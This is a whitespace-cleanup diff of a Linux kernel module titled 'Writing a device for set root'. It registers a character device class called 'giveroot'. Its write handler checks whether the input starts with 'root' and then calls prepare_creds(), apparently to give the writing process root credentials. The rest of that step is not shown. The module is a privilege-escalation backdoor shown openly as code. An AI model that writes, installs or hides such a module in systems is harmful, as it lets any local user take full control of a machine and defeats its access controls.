@@ -14,13 +14,13 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("mtzsec");
 MODULE_DESCRIPTION("Writing a device for set root");
 
-static int major_number;                     
-static struct class* giveroot = NULL;       
-static struct device* c_device = NULL;       
+static int major_number;
+static struct class* giveroot = NULL;
+static struct device* c_device = NULL;
 
 static ssize_t x_write(struct file *file, const char __user *buffer, size_t len, loff_t *offset) {
     char *kernel_buffer;
-    
+
     kernel_buffer = kmalloc(len + 1, GFP_KERNEL);
     if (!kernel_buffer)
         return -ENOMEM;
@@ -29,9 +29,9 @@ static ssize_t x_write(struct file *file, const char __user *buffer, size_t len,
         kfree(kernel_buffer);
         return -EFAULT;
     }
-    
+
     kernel_buffer[len] = '\0';
-    
+
     if (strncmp(kernel_buffer, "root", 4) == 0) {
         struct cred *new_creds;
         new_creds = prepare_creds();
@@ -89,7 +89,7 @@ static int __init device_init(void) {
 static void __exit device_exit(void) {
     device_destroy(giveroot, MKDEV(major_number, 0));
     class_destroy(giveroot);
-    unregister_chrdev(major_number, DEVICE); 
+    unregister_chrdev(major_number, DEVICE);
     printk(KERN_INFO "Device removed!\n");
 }
 
